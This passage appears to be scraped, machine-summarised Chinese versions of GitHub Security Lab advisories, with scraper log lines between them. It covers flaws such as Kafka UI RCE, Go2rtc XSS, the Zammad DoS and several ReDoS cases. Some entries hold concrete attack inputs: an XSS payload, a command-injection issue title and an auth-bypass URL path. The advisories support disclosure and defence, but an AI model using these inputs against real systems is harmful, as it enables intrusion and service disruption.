+   - 返回值检查不足，可能导致进一步的内存损坏。
+
+### 漏洞后果
+
+- 恶意虚拟机可以崩溃宿主机，导致服务拒绝。
+- 在某些情况下，可能发生内存损坏。
+
+## 漏洞验证
+
+- 为验证这些漏洞，可以使用简单的多重引导内核作为证明概念（PoC），需要在启动时使能vtrnd设备。
+
+### 编译说明
+
+- 将漏洞分析代码放入C文件，并添加文件`linker.ld`和`start.s`。
+- 需要安装 `nasm` 和 `i686-elf-gcc` 进行编译。
+
+### 联系方式
+
+- 请将问题发送至 GHSL 团队邮箱 `securitylab@github.com`，并在通信中提及 `GHSL-YEAR-ID`。
+
+## 总结
+
+以上漏洞说明了在hyperkit中，如何利用未检查的指针调用导致宿主机崩溃或内存损坏的风险。确保在开发和维护中遵循严格的错误检查机制，以减少潜在的安全风险。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2021_054_057_Hyperkit中的代码执行漏洞_cdafaa31.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-054_057-moby-hyperkit/
+# GHSL-2020-096: 缺失主机名验证（CVE-2020-24393）
+
+## 概述
+在`tweetstream`库中，缺少对主机名的验证，这使得攻击者能够进行中间人攻击。
+
+## 受影响的版本
+- `tweetstream`版本：**2.6.1**
+
+## 问题描述
+`tweetstream`库不安全地使用了`eventmachine`，这使得攻击者可以伪装成一个可信任的服务器，向用户发送恶意数据。
+
+### 漏洞触发
+攻击者只需设置一个简单的支持TLS的监听程序，就可以利用这一漏洞。以下是操作步骤的简要说明：
+
+1. 创建一个样例客户端。
+2. 运行该客户端，观察到连接建立到之前初始化的监听程序。
+
+## 漏洞类型
+- **CWE-297**: 不当验证证书导致主机不匹配
+
+## 报告信息
+该问题由GHSL团队成员[@agustingianni](https://github.com/agustingianni)发现并报告。
+
+如需进一步沟通，请联系 GHSL 团队：`securitylab@github.com`，并在邮件中提及 **GHSL-2020-096**。
+Folder '其他' created.
+其他
+内容已保存至 其他/GHSL_2020_096_缺失主机名验证_CVE_2020_24393_a90a29df.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-096-tweetstream-tweetstream/
+# GHSL-2021-061: @diez/generation库中的命令注入漏洞 - CVE-2021-32830
+
+## 概述
+`@diez/generation`库中的`locateFont`方法存在命令注入漏洞。这意味着使用这个库的开发者可能会无意中写出含有安全漏洞的代码。
+
+## 漏洞详情
+- **发现时间**: 2021年3月25日
+- **受影响的方法**: `locateFont`
+- **操作系统**: 该漏洞在MacOS或经过特定修补的Unix系统上可被攻击利用。
+
+## 漏洞示例
+1. 安装`@diez/generation`库。
+2. 创建一个包含特定内容的文件。
+3. 运行该文件后，会在文件系统中生成一个名为`exploit`的文件。
+
+## 风险
+如果该库的用户在调用受影响的方法时传入不可信的输入，攻击者可利用此漏洞进行远程代码执行。
+
+## 相关的命令注入漏洞
+此漏洞与其他JavaScript库中的命令注入问题类似，例如：
+- CVE-2020-7646
+- CVE-2020-7614
+- CVE-2020-7597
+- CVE-2019-10778
+- 等等...
+
+## 报告者
+该问题由GitHub工程师@erik-krogh发现并报告。
+
+## 联系方式
+如需更多信息，请联系GitHub安全实验室团队：securitylab@github.com，并在交流中提及GHSL-2021-061。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2021_061_diez_generation库中的命令注入漏洞_CVE_202_19058d3a.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-061-diez-generation-cmd-injection/
+# GHSL-2021-1010: Alpine中的身份验证绕过 - CVE-2022-23554
+
+## 问题概述
+
+Alpine版本1.10.2存在一个身份验证绕过的漏洞。具体而言，AuthenticationFilter组件无法正确处理某些请求URI，从而可能导致未授权访问。
+
+## 技术细节
+
+- **漏洞类型**: 身份验证绕过
+- **影响范围**: 通过特定的URL路径访问swagger接口
+- **示例URL**: `/api/foo;%2fapi%2fswagger`
+
+### 漏洞原理
+
+AuthenticationFilter使用请求的URI来判断用户是否在访问swagger接口。当请求的路径格式不正确，例如使用拼接的符号“;%2f”，就会导致AuthenticationFilter无法正确评估身份验证条件。这种情况下，系统将继续处理请求，但不会为用户分配principal对象。
+
+### 影响
+
+虽然此漏洞可能导致非授权的访问，但无法实现用户冒充。
+
+## 报告人
+
+此漏洞由GHSL团队成员@pwntester（阿尔瓦罗·穆纽斯）发现并报告。
+
+## 联系信息
+
+如需讨论此问题，请联系GHSL团队，电子邮件：securitylab@github.com，并在通信中提及GHSL-2021-1010。
+Folder '身份验证绕过漏洞' created.
+身份验证绕过漏洞
+内容已保存至 身份验证绕过漏洞/GHSL_2021_1010_Alpine中的身份验证绕过_CVE_2022_23554_60d736da.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-1010-Alpine/
+# GHSL-2021-1047: Mind-elixir 中的跨站脚本（XSS）漏洞 - CVE-2021-32851
+
+## 概述
+Mind-elixir 是一款软件，在处理不可信的菜单时存在跨站脚本（XSS）漏洞。
+
+## 版本
+- 受影响版本：v0.12.2
+
+## 漏洞详情
+如果攻击者能够影响创建 MindElixir 实例时的字段名称，他们可能会插入任意的 HTML 或 JavaScript 代码。这些代码将在用户的上下文中执行，从而可能导致 XSS 攻击。
+
+### 漏洞示例
+- 漏洞代码位置：contextMenu.js
+
+## 风险
+此漏洞可能导致 XSS 攻击。
+
+## 报告者
+该问题由 GitHub 团队成员 @erik-krogh（Erik Krogh Kristensen）发现。
+
+## 联系方式
+如需咨询，请联系 GHSL 团队：securitylab@github.com，并在通信时引用 GHSL-2021-1047。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2021_1047_Mind_elixir_中的跨站脚本_XSS_漏洞_CVE_20_abce0779.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-1047_Mind-elixir/
+# GHSL-2020-235: 任意命令注入漏洞在 wayou/turn-issues-to-posts-action 中
+
+## 概述
+`turn-issues-to-posts` 操作存在一个任意命令注入的漏洞。
+
+## 漏洞细节
+这个漏洞出现在使用问题标题格式化 Bash 脚本的过程中。具体来说，问题的标题会被用作脚本代码的一部分。
+
+### 示例
+攻击者可以通过设置特定的标题来注入命令。例如，如果问题标题为 `a".md; echo "test" #`，那么在操作日志中会输出 `test`。
+
+## 安全隐患
+由于这个漏洞，攻击者可能会利用它来获取敏感信息，比如安全令牌。
+
+## 发现者
+此问题由 GHSL 团队成员 @JarLob (Jaroslav Lobačevski) 发现并报告。
+
+## 联系方式
+如需进一步信息，请通过电子邮件与 GHSL 团队联系，邮箱地址是 securitylab@github.com，并在邮件中提及 GHSL-2020-235。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2020_235_任意命令注入漏洞在_wayou_turn_issues_to_post_94021a18.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-235-wayou-turn-issues-to-posts-action/
+# GHSL-2022-008: OWASP 企业安全 API (ESAPI) 的路径遍历漏洞 - CVE-2022-23457
+
+## 漏洞描述
+在 `getValidDirectoryPath` 方法中，父目录的兄弟目录被错误地当作子目录处理。
+
+## OWASP 企业安全 API (ESAPI)
+- 当前版本：v2.2.3.1（这是“传统”2.x 版本的最新版本，因为 ESAPI 3.x 仍在初期开发中，尚未发布）
+
+## 技术细节
+- `parent` 参数：`getValidDirectoryPath` 方法的第三个参数，用于验证输入路径是否在指定的父目录内。
+- 对于路径检查的逻辑来说，如果 `parent.getCanonicalPath()` 结果没有以斜杠结束，将允许部分路径遍历。
+
+### 示例
+考虑以下代码示例：
+```java
+"/usr/outnot".startsWith("/usr/out")
+```
+- 在这段代码中，虽然 `outnot` 并不在 `out` 目录下，但路径检查仍然通过了。
+
+### 斜杠处理的问题
+- 在不同情况下，根目录的斜杠可能会被去掉。例如：
+  - `println(new File("/var/"))` 输出: `/var`
+  - `println(new File("/var", "/"))` 输出: `/var/`
+  - `println(new File("/var", "/").getCanonicalPath())` 输出: `/var`
+
+## 漏洞影响
+这个漏洞允许攻击者突破预期的目录限制。
+
+## 报告信息
+这个问题是由 GHSL 团队成员 @JarLob (Jaroslav Lobačevski) 发现并报告的。如需联系 GHSL 团队，可以发送邮件至 securitylab@github.com，在任何与此问题相关的交流中，请包含 GHSL-2022-008 的引用。
+Folder '任意文件读写漏洞' already exists.
+任意文件读写漏洞
+内容已保存至 任意文件读写漏洞/GHSL_2022_008_OWASP_企业安全_API_ESAPI_的路径遍历漏洞_CV_a787f1bf.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-008_The_OWASP_Enterprise_Security_API/
+# GHSL-2020-254: dotmesh中的任意文件读取和写入漏洞 - CVE-2020-26312
+
+## 概述
+在dotmesh中，由于不安全的符号链接处理，攻击者可以读取和/或写入目标文件夹外的任意位置。
+
+## 技术细节
+
+- **漏洞原因**: 在解压tar档案时，`untarFile` 函数本意是防止创建指向档案外部的符号链接。但攻击者可以利用一个特殊制作的tar档案，创建指向档案父目录的符号链接。
+  
+- **利用方式**:
+  1. 攻击者的tar档案首先创建一个指向上层目录的符号链接（例如：`subdir/parent`指向`..`）。
+  2. 然后创建另一个符号链接（例如：`subdir/parent/escapes`指向`..`），导致这个链接指向tar档案的父目录。
+
+- **后果**:
+  - **任意文件写入**: 如果攻击者可以控制档案文件，他们可以写入任意文件，权限与运行解压操作的程序相同。
+  - **任意文件读取**: 如果攻击者可以读取解压后的文件，他们可能会读取系统中任意文件，只要该文件的权限允许读取。
+
+## 报告信息
+- 本漏洞由GitHub团队成员@smowton（Chris Smowton）发现并报告。
+- 有关此问题的沟通，请联系GHSL团队，邮箱是securitylab@github.com，并在通信中提及GHSL-2020-254。
+Folder '任意文件读写漏洞' already exists.
+任意文件读写漏洞
+内容已保存至 任意文件读写漏洞/GHSL_2020_254_dotmesh中的任意文件读取和写入漏洞_CVE_2020_263_4bdc6a89.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-254-zipslip-dotmesh/
+# GHSL-2022-031_GHSL-2022-032: Nokogiri中的类型混淆导致内存泄漏或拒绝服务 - CVE-2022-29181
+
+## 概述
+Nokogiri库在处理恶意数据时存在两个类型混淆的问题。这些问题可能导致内存内容泄露或拒绝服务（DoS）攻击。
+
+## 影响版本
+- **Nokogiri v1.13.4**
+
+## 问题描述
+攻击者可以控制传递给`parse_memory`函数的对象类型，允许传入非字符串对象，例如整数。由于整数作为即时值而不是指针，尝试访问无效的内存地址时，进程会崩溃。
+
+### 技术细节
+以下的代码片段展示了一个问题：
+```c
+// 从 xml_sax_parser_context.c#L68 中获取的片段
+RSTRING_LEN(data);
+```
+在这里，代码没有检查传入对象的类型是否为 T_STRING。通常情况下，应该使用`Check_Type(data, T_STRING)`来进行检查，但在此代码中并未执行任何检查。
+
+### 漏洞影响
+- **拒绝服务（DoS）：** 攻击者可以通过反复崩溃服务器，猜测有效的内存地址。
+- **信息泄露：** 如果Nokogiri的解析结果被返回给攻击者，可能会泄露到内存中的任意Ruby字符串，包括机密信息。
+
+## 其他影响
+在html4版本的解析器中也发现了同样的漏洞：
+```c
+// 从 html4_sax_parser_context.c#L25 中获取的片段
+```
+
+## 报告信息
+这些问题是由GHSL团队成员@agustingianni发现并报告的。  
+如需与GHSL团队联系，请发送电子邮件至 securitylab@github.com，并在相关通信中提及 GHSL-2022-031 或 GHSL-2022-032。
+
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2022_031_GHSL_2022_032_Nokogiri中的类型混淆导致内存泄漏或_65b17be0.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-031_GHSL-2022-032_Nokogiri/
+# GHSL-2024-096: DNS重绑定漏洞 - CVE-2024-42364
+
+## 概述
+Homepage 在默认设置下存在 DNS 重绑定漏洞，攻击者可以借此访问主页所有者的私密信息。
+
+## 漏洞详情
+- **软件版本**: homepage v0.9.1
+- **漏洞类型**: DNS 重绑定
+
+## 技术背景
+1. **DNS 重绑定**:
+   - 攻击者会诱使用户访问其网站。
+   - 在用户访问时，攻击者将其域名的 DNS 记录从自己的 IP 地址更改为主页实例的内部 IP 地址。
+   - 通过绑定子域名到不同的 IP 地址，攻击者可以检查哪些 IP 地址有效。
+
+2. **攻击过程**:
+   - 一旦找到有效的内部 IP 地址，攻击者可以读取来自主页实例的响应。
+   - 攻击者网站的请求会被主页实例处理，因此可以获取用户的私密信息，例如 API 密钥等。
+
+## 风险
+- **信息泄露**: 攻击者能够从与受害者在同一内网的 homepage 实例中窃取信息。
+
+## 报告信息
+该问题由 GHSL 团队成员 @Kwstubbs (Kevin Stubbings) 发现并报告。若有该漏洞相关的疑问，可以通过 `securitylab@github.com` 联系 GHSL 团队，请在邮件中提及 GHSL-2024-096。
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2024_096_DNS重绑定漏洞_CVE_2024_42364_48a6d8f1.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-096_homepage/
+# GHSL-2021-058: 虚拟化环境中主机内存泄露漏洞 - CVE-2021-32847
+
+## 概述
+在虚拟化环境中，恶意的虚拟机（guest）可能会利用一个漏洞，通过磁盘驱动程序泄露主机（host）的内存。该漏洞影响了 **hyperkit** 版本 v0.20210107。
+
+## 技术细节
+### 漏洞原因
+1. **功能描述**: `pci_vtblk_proc` 函数处理来自虚拟机的磁盘I/O操作请求。操作 `VBH_OP_DISCARD` 存在安全漏洞，允许攻击者读取虚拟机以外的内存。
+2. **代码错误**: 在 `pci_virtio_block.c` 文件中，错误地将等式操作符 `==` 写成了赋值操作符 `=`。这导致一个断言总是返回真，忽略了输入数据的大小检查。
+
+### 漏洞利用
+- 恶意虚拟机通过先设置已知状态的磁盘镜像，再触发该漏洞，能够利用无效的内存指针 `iov[1].iov_base` 来访问主机内存。
+- 攻击者可以控制 `num_sectors` 字段，从而读取被覆盖的内存字节。
+
+### 实践影响
+这个漏洞的影响更严重，因为在测试中，虚拟机的内存位置恰好与主机的其他内存区域相连，可能导致恶意代码操控内存。
+
+## 复现漏洞
+- **准备工作**: 
+  - 编译 hyperkit 时，需启用 `AddressSanitizer` 以便检测无效内存读取。
+  - 利用示例代码创建多启动内核，虚拟机需启用 `virtio-blk` 设备。
+
+### 编译步骤
+1. 将示例代码放入一个 C 文件，并准备以下文件：
+   - `linker.ld`
+   - `start.s`
+2. 安装必要的编译工具：
+   - `nasm`
+   - `i686-elf-gcc`
+
+## 发现和联系信息
+该漏洞由 GHSL 团队成员 Agustin Gianni 发现。如果您有更多问题，欢迎通过 email 联系 GHSL 团队：securitylab@github.com，邮件中请提及 GHSL-2021-58。
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2021_058_虚拟化环境中主机内存泄露漏洞_CVE_2021_32847_49b0f7b5.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-058-moby-hyperkit/
+# GHSL-2023-229_GHSL-2023-230: Apache Kafka UI 中的远程代码执行漏洞
+
+## 概述
+Apache Kafka UI 存在两个远程代码执行（RCE）漏洞，编号为 CVE-2023-52251 和 CVE-2024-32030。以下是这两个漏洞的详细介绍：
+
+## 漏洞细节
+
+1. **漏洞一：无沙箱的 Groovy 脚本执行**
+   - Kafka UI 中的消息过滤组件允许用户使用 `GROOVY_SCRIPT` 类型的过滤器。
+   - 攻击者可以利用这一点，在服务器上执行任意 Groovy 脚本，不受沙箱限制。
+
+2. **漏洞二：通过 JMX 服务器的反序列化攻击**
+   - Kafka UI 允许连接到 JMX 服务器，如果连接的是恶意服务器，攻击者可以利用不安全的反序列化机制远程执行代码。
+   - Kafka UI 默认情况下没有启用身份验证，这使得漏洞更加危险。如果启用了身份验证，攻击者仍需有效账号才能利用漏洞。
+
+## 技术背景
+- **Groovy 脚本过滤器**
+  - 该过滤器使得攻击者可以查看消息内容及其属性，并执行任意代码。
+  - 漏洞方法位置：`com.provectus.kafka.ui.emitter.MessageFilters#groovyScriptFilter`
+
+- **JMX（Java Management Extensions）**
+  - 允许监控 Kafka 代理性能，通过 RMI（远程方法调用）协议进行。
+  - 攻击者可以创建伪造的 RMI 监听器，返回恶意序列化对象，从而实现代码执行。
+
+## 漏洞利用步骤
+1. **设置 RMI 监听器**
+   - 攻击者在自己的系统上设置伪造的 RMI 监听器，使其返回恶意对象。
+
+2. **触发反序列化**
+   - Kafka UI 连接到该恶意 RMI 监听器，触发恶意对象的反序列化。
+   - 该过程可能记录错误日志，该行为正常。
+
+3. **执行命令**
+   - 如果在窝藏过程中，系统属性 `org.apache.commons.collections.enableUnsafeSerialization` 被设置为 true，接下来的反序列化将导致攻击者指定命令的执行。
+
+## 结论
+这些漏洞的有效利用可能导致即使在身份验证后也可进行远程代码执行。用户应小心使用 Kafka UI，尤其是在没有进行适当安全配置的情况下。
+
+## 联系信息
+如果需要更多技术支持或报告问题，可以联系 GHSL 团队： securitylab@github.com，并提及 GHSL-2023-229 或 GHSL-2023-230。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_229_GHSL_2023_230_Apache_Kafka_UI_中的远程代_5a3c49fb.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-229_GHSL-2023-230_kafka-ui/
+# GHSL-2023-205_GHSL-2023-206: Go2rtc的XSS和命令执行漏洞
+
+## 概述
+
+Go2rtc 存在跨站脚本（XSS）和任意命令执行漏洞，原因是未对用户输入进行清理。
+
+### 相关漏洞
+
+- **CVE-2024-29191**: XSS漏洞
+- **CVE-2024-29192**: XSS漏洞
+- **CVE-2024-29193**: 任意命令执行漏洞
+
+## 技术细节
+
+### XSS漏洞
+
+- **触发条件**：
+  - 在 `links.html` 页面中，使用 `src` GET 参数显示链接。
+  - `src` 参数通过 `innerHTML` 直接插入，这可能导致DOM级别的XSS攻击。
+
+- **示例Payload**：
+  ```html
+  foo">foo</a></li><img src="x" onerror="alert(document.location)"><!--
+  ```
+
+- **进一步影响**：
+  - 在 `index.html` 页面，使用 API 拉取可用流，并通过 `innerHTML` 显示流的名称，存在相似的XSS风险。
+
+### 任意命令执行漏洞
+
+- **漏洞描述**：
+  - `/api/config` 端点允许用户修改配置，未对请求做CSRF保护。
+  - 攻击者可以利用此缺陷，通过添加自定义流实现任意命令执行。
+
+### 利用方式
+
+- **驱动攻击（Drive-by attack）**：
+  - 设置一个服务器，托管特定的代码片段。
+  - 当受害者访问该服务器时，其浏览器会向 Go2rtc 实例发起请求，可能导致XSS执行和任意命令执行。
+
+## 发现和报告
+
+- 这些问题是由 GHSL 团队成员 @jorgectf 和 @maclarel 发现并报告的。
+
+## 联系方式
+
+如需联系 GHSL 团队，请发送邮件至 `securitylab@github.com`，并在邮件中引用 GHSL-2023-205、GHSL-2023-206 相关问题。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_205_GHSL_2023_206_Go2rtc的XSS和命令执行漏洞_c69c5f7c.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-205_GHSL-2023-207_go2rtc/
+# GHSL-2024-100 to GHSL-2024-108: Streamlit-geospatial 中的漏洞
+
+### 概述
+Streamlit-geospatial 项目存在多项安全漏洞，包括远程代码执行 (RCE) 和盲服务器端请求伪造 (SSRF)。
+
+### 关键技术知识点
+
+1. **远程代码执行 (RCE)**:
+   - 当用户输入的数据被错误地用于执行代码时，就会出现 RCE 漏洞。在以下情况下，用户输入会通过 `eval()` 函数执行，导致潜在的远程代码执行：
+     - `pages/1_📷_Timelapse.py` 中的 `palette` 和 `vis_params` 变量，在多行代码（如 380, 395, 430, 493, 1254, 1345, 115, 126, 80, 86）中接收用户输入并被执行。
+
+2. **盲服务器端请求伪造 (SSRF)**:
+   - SSRF 漏洞允许攻击者发送请求到内部或外部的任意地址，而不需要直接与目标交互。这主要发生在以下几个函数中：
+     - `pages/1_📷_Timelapse.py` 中，用户输入的 `url` 参数被传递到 `get_layers` 函数，导致发送请求到任意目的地。
+     - `8_🏜️_Raster_Data_Visualization.py` 中，用户输入的 `url` 参数被传递给 `gpd.read_file` 方法，同样引发 SSRF。
+
+### 风险
+- RCE 漏洞可能导致攻击者在受害服务器上执行任意代码。
+- SSRF 漏洞可以被用来探测其他系统中的漏洞，尤其是在攻击者可以访问的内部网络。
+
+### 联系方式
+如有问题或建议，请联系 GHSL 团队：securitylab@github.com。在沟通时请提及 GHSL-2024-100 到 GHSL-2024-108 的相关参考。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_100_to_GHSL_2024_108_Streamlit_geospati_9bb54129.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-100_GHSL-2024-108_streamlit-geospatial/
+# GHSL-2024-089: youtube-dl中的路径遍历漏洞 - CVE-2024-38519
+
+## 概述
+在使用youtube-dl下载带字幕的视频时，它没有验证字幕文件的扩展名。这使得Windows用户面临路径遍历的风险，可能导致任意二进制文件被覆盖。
+
+## youtube-dl
+- **受影响的版本**：
+  - 夜间版本：v2024.05.16
+  - 官方最后版本：v2021.12.17
+
+### 功能
+youtube-dl不仅可以下载视频文件，还可以下载字幕，用户可以通过以下选项指定：
+- `--write-sub`：下载字幕
+- `--write-auto-sub`：下载自动生成的字幕
+- `--all-subs`：下载所有可用字幕
+
+每个支持的视频网站都有自己的数据提取器。有些提取器提供字幕URL，并从URL路径解析扩展名。其他一些提取器明确提供了字幕的URL和扩展名。
+
+### 安全问题
+- **漏洞**：在Windows上，用户可以通过精心构造的字幕扩展名进行路径遍历攻击。
+- **影响**：攻击者可以在用户下载视频时，通过恶意字幕扩展名覆盖系统文件。
+- **原因**：youtube-dl简单地信任提取器提供的扩展名，构建输出文件名。
+
+### 技术细节
+- 默认输出文件模板：`%(title)s-%(id)s.%(ext)s`
+- 字幕文件命名格式：`%(title)s-%(id)s.%(sub_lang).%(sub_format)s`
+- Linux系统对路径遍历攻击不敏感，而Windows系统可能受到影响。
+
+### 潜在风险
+如果攻击者覆盖了可执行文件，可能导致**远程代码执行**。
+
+## 联系
+此问题由GHSL团队成员@JarLob（Jaroslav Lobačevski）发现并报告。若有相关问题，请联系GHSL团队：securitylab@github.com，并在通信中引用GHSL-2024-089。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_089_youtube_dl中的路径遍历漏洞_CVE_2024_38519_e771090d.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl/
+# GHSL-2024-030: 潜在的秘密泄露漏洞在 docfx 的 Pull Request 中
+
+## 漏洞概述
+在 dotnet/docfx 仓库中，由于不安全地使用 `pull_request_target`，导致可能泄露机密信息。
+
+### 关键概念
+- **Pull Request**：一种在 GitHub 上提议代码修改的方式。
+- **pull_request_target**：一种 GitHub 事件，允许在 Pull Request 中运行代码。
+  
+## 为什么会有漏洞？
+- 在 ci.yml 工作流中，`pull_request_target` 事件直接检查 Pull Request 的代码，这样攻击者控制的代码就会被运行。
+- 如果从用户的分支中获取并执行不受信任的代码，这会导致该代码在能够访问机密（如 secrets.PERCY_TOKEN）的环境中运行。
+
+### 可能的攻击
+攻击者可以创建一个包括恶意 `templates/packages.json` 文件的 Pull Request，这个文件可以执行任意命令，从而获取与工作流共享的机密。
+
+## 漏洞验证
+使用特定的 CodeQL 查询可检测到在受信任环境中运行不受信任代码的漏洞。
+
+## 危害
+如果运行不受信任的代码并使用特权的仓库令牌，可能导致：
+- 未授权的仓库修改
+- 机密泄露（例如：secrets.PERCY_TOKEN）
+
+## 报告和联系
+该问题由 GHSL 团队成员 @pwntester（Alvaro Muñoz）发现并报告。如需更多信息，请联系 GHSL 团队：securitylab@github.com，并在交流中提及 GHSL-2024-030。
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2024_030_潜在的秘密泄露漏洞在_docfx_的_Pull_Request_中_54d29777.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-030_dotnet_docfx/
+# GHSL-2024-029: Zammad软件中的服务拒绝（DoS）漏洞 - CVE-2024-33667
+
+## 概述
+
+在帮助台软件Zammad中发现了一个服务拒绝（DoS）漏洞。经过身份验证的攻击者可以阻止该网络应用程序处理任何请求。
+
+## 受影响的软件版本
+
+- Zammad v6.2.0
+
+## 漏洞详情
+
+1. **攻击方式**：
+   - 经过身份验证的用户可以执行远程服务拒绝攻击。
+   - Zammad提供导出帮助台工作人员日历的接口，格式为iCal。
+
+2. **技术原理**：
+   - 使用的参数通过URL传递，并进入`CalendarSubscriptions`类中的`generic`方法。
+   - `generic`方法调用`generic_call`，后者根据方法名创建一个并调用方法对象。
+   - Ruby允许方法对象引用任何可用的方法，包括父类中的方法（如Object和BasicObject）。
+   - `Kernel`模块的方法在所有Ruby对象中可用。
+
+3. **漏洞利用**：
+   - 大多数关于这种漏洞的公开信息提到了一些破坏性的方法（如`exit`和`exit!`）。
+   - 但研究发现，使用`Kernel`中的`sleep`方法可能更有效。
+   - 传递不带持续时间参数的`sleep`会使当前请求线程永远挂起。
+   - 比如，如果Rails应用最多启动5个线程（RAILS_MAX_THREADS=5）和2个Puma工作进程（WEB_CONCURRENCY=2），那么发送10个请求将使应用不再响应。
+
+4. **攻击示例**：
+   - 通过设置`params[:method]`为`sleep`来触发这个漏洞。
+   - 提示：用有效的（经过身份验证的）`_zammad_session_` cookie替换请求中的值。
+
+5. **攻击途径**：
+   - 攻击者可以引导Zammad工作人员访问他们控制的网站，该网站会调用该接口（例如，通过在`img`标签中加载）。
+   - 由于GET请求足以触发该漏洞，因此经过身份验证的cookie会自动由浏览器发送。
+
+## 风险
+
+- 此漏洞可能导致服务拒绝（DoS）。
+- 如果可以调用的方法返回信息，可能导致信息泄露。
+
+## 报告信息
+
+此漏洞由GHSL团队成员@p-（Peter Stöckli）发现并报告。如需联系GHSL团队，请发送邮件至securitylab@github.com，并在通信中引用GHSL-2024-029。
+Folder 'DoS' created.
+DoS
+内容已保存至 DoS/GHSL_2024_029_Zammad软件中的服务拒绝_DoS_漏洞_CVE_2024_33_a1fb2fc0.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-029_Zammad/
+# GHSL-2021-118: Zulip中的ReDoS（正则表达式拒绝服务） - CVE-2021-41115
+
+Zulip软件中存在一个正则表达式漏洞，属于ReDoS（正则表达式拒绝服务）类型。
+
+## 什么是ReDoS？
+
+- **ReDoS**：这是一种攻击，利用不高效的正则表达式，导致在处理特殊输入时消耗过多时间，从而使服务变得不可用。
+
+## 漏洞背景
+
+- **发现方式**：该漏洞是通过CodeQL查询工具识别不高效的正则表达式发现的。
+- **受影响的版本**：Zulip 4.5 版本
+
+## 漏洞详情
+
+- 存在两个不同的正则表达式容易受到攻击（具体定义在文中）。
+
+## 重现漏洞步骤
+
+1. **在Zulip组织中重现**：
+   - 按照文中提供的步骤在真实的Zulip组织中测试。
+
+2. **单独文件测试**：
+   - 将易受攻击的正则表达式复制并粘贴到一个新文件中（步骤详见文中）。
+
+## 风险说明
+
+- 如果利用这个漏洞，可能会导致服务拒绝，影响用户使用。
+
+## 发现团队
+
+- 该问题由GitHub团队的成员 @erik-krogh 和 @yoff 发现。
+
+## 联系信息
+
+- 如有疑问，请联系GHSL团队：securitylab@github.com，并在邮件中引用GHSL-2021-118。
+
+希望上述内容能够帮助您更好地理解该漏洞及其影响。
+Folder '正则表达式拒绝服务' created.
+正则表达式拒绝服务
+内容已保存至 正则表达式拒绝服务/GHSL_2021_118_Zulip中的ReDoS_正则表达式拒绝服务_CVE_2021_ab82782b.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2021-118-zulip-zulip/
+# GHSL-2020-305: ReDoS 漏洞简述
+
+## 概述
+该项目中存在一个或多个正则表达式，容易受到 **ReDoS**（正则表达式拒绝服务）攻击。
+
+### 什么是 ReDoS？
+- **ReDoS** 是一种漏洞，发生在构造不当或效率低下的正则表达式上。
+- 如果输入字符串经过精心构造，攻击者可以使正则表达式的执行时间变得极其缓慢，达到 **O(2^n)** 的运行时间。
+
+## 漏洞原因
+- ReDoS 通常由正则表达式中某些部分的模糊性或重叠性引起。
+- 如果用户可以控制输入（如输入验证库），这些慢效能的正则表达式就可能导致安全问题。
+- 修复 ReDoS 的一般方法是消除正则表达式内部的模糊性和重叠性。
+
+## 示例
+### 漏洞示例
+#### HTML 注释匹配
+```regex
+<!--.*?-->
+```
+- 这个正则表达式尝试匹配 HTML 注释。
+- `.` 匹配任何字符（除了换行符），而 `\s` 匹配空白字符。
+- 当输入是一个包含长空格的字符串时，正则表达式会尝试所有匹配方式，导致性能下降。
+
+#### 修复方法
+将正则表达式改为更具体的版本，消除模糊性。
+
+### 另一个示例
+#### snake_case 标识符匹配
+```regex
+(\w+_?)+
+```
+- 这个表达式尝试匹配以字母开头的字符串，允许不分组的重复。
+- 输入以大量字母开头时，也会导致多种匹配方式。
+
+#### 修复方法
+将内层重复修改为必须以下划线结束的版本，减少模糊性。
+
+## 复杂示例
+- 有些正则表达式复杂得多，例如曾在 VS Code 中使用的正则表达式。
+- 在这里，通过调整过于宽泛的部分（如 `\S`），使其更具体（比如 `[^\s\(\)]`），消除重叠问题。
+
+## 发现与报告
+- 此漏洞由 GitHub 的 @erik-krogh 团队成员发现并报告。
+- 可能导致拒绝服务问题。
+
+## 联系方式
+如需更多信息，请联系 GHSL 团队：securitylab@github.com，并在通信中提及 GHSL-2020-305。
+Folder '正则表达式拒绝服务' already exists.
+正则表达式拒绝服务
+内容已保存至 正则表达式拒绝服务/GHSL_2020_305_ReDoS_漏洞简述_0da0cebe.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2020-305-redos-Pure-JavaScript-HTML5-Parser/
+# GHSL-2024-069: 不安全的 YAML 反序列化漏洞在 ngrinder 中
+
+## 概述
+在对 GHSL-2023-239/CVE-2024-28212 的重新测试中发现，ngrinder 的 `/script/api/github/validate` 接口仍然存在不安全的 YAML 反序列化漏洞。虽然这个漏洞可能不会造成重大影响，但仍值得注意。
+
